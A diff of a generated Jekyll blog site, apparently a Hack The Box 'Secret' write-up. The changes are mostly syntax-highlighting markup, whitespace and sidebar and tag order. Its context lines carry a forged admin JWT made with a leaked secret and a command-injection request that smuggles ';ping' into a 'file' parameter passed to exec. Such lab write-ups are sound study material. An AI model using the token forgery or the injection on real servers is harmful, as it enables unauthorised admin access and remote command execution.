@@ -955,8 +955,8 @@ curl <span class="nt">-d</span> <span class="s1">'{"email":"dfdfdfdf@secret.com"
 2
 3
 </pre></td><td class="rouge-code"><pre><span class="c1">// Dotenv loads environment variables from a .env file into process.env</span>
-<span class="kd">const</span> <span class="nx">dotenv</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">dotenv</span><span class="dl">'</span><span class="p">)</span>
-<span class="nx">dotenv</span><span class="p">.</span><span class="nx">config</span><span class="p">();</span>
+<span class="kd">const</span> <span class="nx">dotenv</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">dotenv</span><span class="dl">'</span><span class="p">)</span>
+<span class="nx">dotenv</span><span class="p">.</span><span class="nf">config</span><span class="p">();</span>
 </pre></td></tr></tbody></table></code></div></div>
 
 <div class="language-javascript nolineno highlighter-rouge" file="/routes/auth.js"><div class="code-header">
@@ -967,10 +967,10 @@ curl <span class="nt">-d</span> <span class="s1">'{"email":"dfdfdfdf@secret.com"
 4
 5
 </pre></td><td class="rouge-code"><pre><span class="c1">// create jwt</span>
-<span class="kd">const</span> <span class="nx">jwt</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">jsonwebtoken</span><span class="dl">"</span><span class="p">);</span>
-<span class="kd">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">sign</span><span class="p">({</span> <span class="na">_id</span><span class="p">:</span> <span class="nx">user</span><span class="p">.</span><span class="nx">id</span><span class="p">,</span> <span class="na">name</span><span class="p">:</span> <span class="nx">user</span><span class="p">.</span><span class="nx">name</span> <span class="p">,</span> <span class="na">email</span><span class="p">:</span> <span class="nx">user</span><span class="p">.</span><span class="nx">email</span><span class="p">},</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">TOKEN_SECRET</span> <span class="p">)</span>
-<span class="nx">res</span><span class="p">.</span><span class="nx">header</span><span class="p">(</span><span class="dl">'</span><span class="s1">auth-token</span><span class="dl">'</span><span class="p">,</span> <span class="nx">token</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="nx">token</span><span class="p">);</span>
-<span class="kd">const</span> <span class="nx">verified</span> <span class="o">=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">verify</span><span class="p">(</span><span class="nx">token</span><span class="p">,</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">TOKEN_SECRET</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">jwt</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">jsonwebtoken</span><span class="dl">"</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nf">sign</span><span class="p">({</span> <span class="na">_id</span><span class="p">:</span> <span class="nx">user</span><span class="p">.</span><span class="nx">id</span><span class="p">,</span> <span class="na">name</span><span class="p">:</span> <span class="nx">user</span><span class="p">.</span><span class="nx">name</span> <span class="p">,</span> <span class="na">email</span><span class="p">:</span> <span class="nx">user</span><span class="p">.</span><span class="nx">email</span><span class="p">},</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">TOKEN_SECRET</span> <span class="p">)</span>
+<span class="nx">res</span><span class="p">.</span><span class="nf">header</span><span class="p">(</span><span class="dl">'</span><span class="s1">auth-token</span><span class="dl">'</span><span class="p">,</span> <span class="nx">token</span><span class="p">).</span><span class="nf">send</span><span class="p">(</span><span class="nx">token</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">verified</span> <span class="o">=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nf">verify</span><span class="p">(</span><span class="nx">token</span><span class="p">,</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">TOKEN_SECRET</span><span class="p">);</span>
 </pre></td></tr></tbody></table></code></div></div>
 
 <h4 id="find-git-information"><span class="mr-2">find git information</span><a href="#find-git-information" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
@@ -1000,11 +1000,11 @@ git show 67d8da7
 4
 5
 6
-</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">jwt</span>
+</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">jwt</span>
 <span class="n">token</span><span class="o">=</span><span class="s">'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTc4MjUzMzJjMmJhYjA0NDVjNDg0NjIiLCJuYW1lIjoiMHhkZjB4ZGYiLCJlbWFpbCI6ImRmZGZkZmRmQHNlY3JldC5jb20iLCJpYXQiOjE2MzUyNjM4Mjh9.rMfMsdYkfSbl4hr1RJFwY3qWfrA3LSWVlzUON_9EW_A'</span>
 <span class="n">secret</span><span class="o">=</span><span class="s">'gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE'</span>
 <span class="c1"># decode
-</span><span class="n">jwt</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">secret</span><span class="p">,</span> <span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="s">"HS256"</span><span class="p">])</span>
+</span><span class="n">jwt</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">secret</span><span class="p">,</span> <span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="s">"HS256"</span><span class="p">])</span>
 <span class="c1"># result-&gt; {'_id': '617825332c2bab0445c48462', 'name': '0xdf0xdf', 'email': 'dfdfdfdf@secret.com', 'iat': 1635263828}
 </span></pre></td></tr></tbody></table></code></div></div>
 <h4 id="create-token"><span class="mr-2">Create Token</span><a href="#create-token" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
@@ -1014,9 +1014,9 @@ git show 67d8da7
 2
 3
 4
-</pre></td><td class="rouge-code"><pre><span class="n">j</span> <span class="o">=</span> <span class="n">jwt</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">secret</span><span class="p">,</span> <span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="s">"HS256"</span><span class="p">])</span>
+</pre></td><td class="rouge-code"><pre><span class="n">j</span> <span class="o">=</span> <span class="n">jwt</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">secret</span><span class="p">,</span> <span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="s">"HS256"</span><span class="p">])</span>
 <span class="n">j</span><span class="p">[</span><span class="s">'name'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'theadmin'</span>
-<span class="n">jwt</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="n">j</span><span class="p">,</span> <span class="n">secret</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="s">"HS256"</span><span class="p">)</span>
+<span class="n">jwt</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="n">j</span><span class="p">,</span> <span class="n">secret</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="s">"HS256"</span><span class="p">)</span>
 <span class="c1"># result-&gt; eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiI2MTc4MjUzMzJjMmJhYjA0NDVjNDg0NjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRmZGZkZmRmQHNlY3JldC5jb20iLCJpYXQiOjE2MzUyNjM4Mjh9.cRgg1KkYXYSwz1xpknTFWTHnx8D-7UMewMubwAGsvQ8
 </span></pre></td></tr></tbody></table></code></div></div>
 
@@ -1033,9 +1033,9 @@ git show 67d8da7
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
-</pre></td><td class="rouge-code"><pre><span class="k">if</span> <span class="p">(</span><span class="nx">name</span> <span class="o">==</span> <span class="dl">'</span><span class="s1">theadmin</span><span class="dl">'</span><span class="p">){</span>
+</pre></td><td class="rouge-code"><pre><span class="nf">if </span><span class="p">(</span><span class="nx">name</span> <span class="o">==</span> <span class="dl">'</span><span class="s1">theadmin</span><span class="dl">'</span><span class="p">){</span>
     <span class="kd">const</span> <span class="nx">getLogs</span> <span class="o">=</span> <span class="s2">`git log --oneline </span><span class="p">${</span><span class="nx">file</span><span class="p">}</span><span class="s2">`</span><span class="p">;</span>
-    <span class="nx">exec</span><span class="p">(</span><span class="nx">getLogs</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span> <span class="p">,</span> <span class="nx">output</span><span class="p">)</span> <span class="o">=&gt;</span><span class="p">{</span>
+    <span class="nf">exec</span><span class="p">(</span><span class="nx">getLogs</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span> <span class="p">,</span> <span class="nx">output</span><span class="p">)</span> <span class="o">=&gt;</span><span class="p">{</span>
 </pre></td></tr></tbody></table></code></div></div>
 <p>try to manituplate to -&gt; <code class="language-plaintext highlighter-rouge">git log --oneline; [any command]</code>
 <code class="language-plaintext highlighter-rouge">curl -s 'http://10.10.11.120/api/logs?file=;ping+-c+1+10.10.14.6' -H "auth-token: {token}" | jq -r .</code>
@@ -1243,6 +1243,11 @@ attacker machine -&gt; <code class="language-plaintext highlighter-rouge">sudo t
         
         
         
+      <li><a href="/posts/Network-Security/">Network Security</a></li>
+      
+        
+        
+        
       <li><a href="/posts/CPP-the-Cherno/">C++ The Cherno</a></li>
       
         
@@ -1259,11 +1264,6 @@ attacker machine -&gt; <code class="language-plaintext highlighter-rouge">sudo t
         
         
       <li><a href="/posts/Linux-for-CTF/">Linux for CTF</a></li>
-      
-        
-        
-        
-      <li><a href="/posts/BOF/">Buffer over flow</a></li>
       
     </ul>
   </div> <!-- #access-lastmod -->
@@ -1395,6 +1395,120 @@ attacker machine -&gt; <code class="language-plaintext highlighter-rouge">sudo t
     
     
     
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
       
         
         
@@ -1619,6 +1733,46 @@ attacker machine -&gt; <code class="language-plaintext highlighter-rouge">sudo t
     
     
     
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
       
         
         
@@ -1737,162 +1891,10 @@ attacker machine -&gt; <code class="language-plaintext highlighter-rouge">sudo t
     
     
     
-      
-    
   
     
     
     
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-        
-        
-
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
     
   
     
@@ -2069,13 +2071,13 @@ attacker machine -&gt; <code class="language-plaintext highlighter-rouge">sudo t
       <a class="post-tag" href="/tags/htb/">htb</a>
     
       
+      <a class="post-tag" href="/tags/linux/">linux</a>
+    
+      
       <a class="post-tag" href="/tags/burpsuite/">burpsuite</a>
     
       
       <a class="post-tag" href="/tags/jekyll/">jekyll</a>
-    
-      
-      <a class="post-tag" href="/tags/linux/">linux</a>
     
       
       <a class="post-tag" href="/tags/oscp/">oscp</a>
@@ -2147,6 +2149,19 @@ attacker machine -&gt; <code class="language-plaintext highlighter-rouge">sudo t
 
 
 
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
 
 
   
@@ -2774,6 +2789,120 @@ nmap -p 22,80,2376 -sCV -oA scans/nmap-tcpscripts 10.10.11.112
     
     
     
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
       
         
         
@@ -2998,6 +3127,46 @@ nmap -p 22,80,2376 -sCV -oA scans/nmap-tcpscripts 10.10.11.112
     
     
     
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
       
         
         
@@ -3116,162 +3285,10 @@ nmap -p 22,80,2376 -sCV -oA scans/nmap-tcpscripts 10.10.11.112
     
     
     
-      
-    
   
     
     
     
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-        
-        
-
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
     
   
     
@@ -3448,13 +3465,13 @@ nmap -p 22,80,2376 -sCV -oA scans/nmap-tcpscripts 10.10.11.112
       <a class="post-tag" href="/tags/htb/">htb</a>
     
       
+      <a class="post-tag" href="/tags/linux/">linux</a>
+    
+      
       <a class="post-tag" href="/tags/burpsuite/">burpsuite</a>
     
       
       <a class="post-tag" href="/tags/jekyll/">jekyll</a>
-    
-      
-      <a class="post-tag" href="/tags/linux/">linux</a>
     
       
       <a class="post-tag" href="/tags/oscp/">oscp</a>
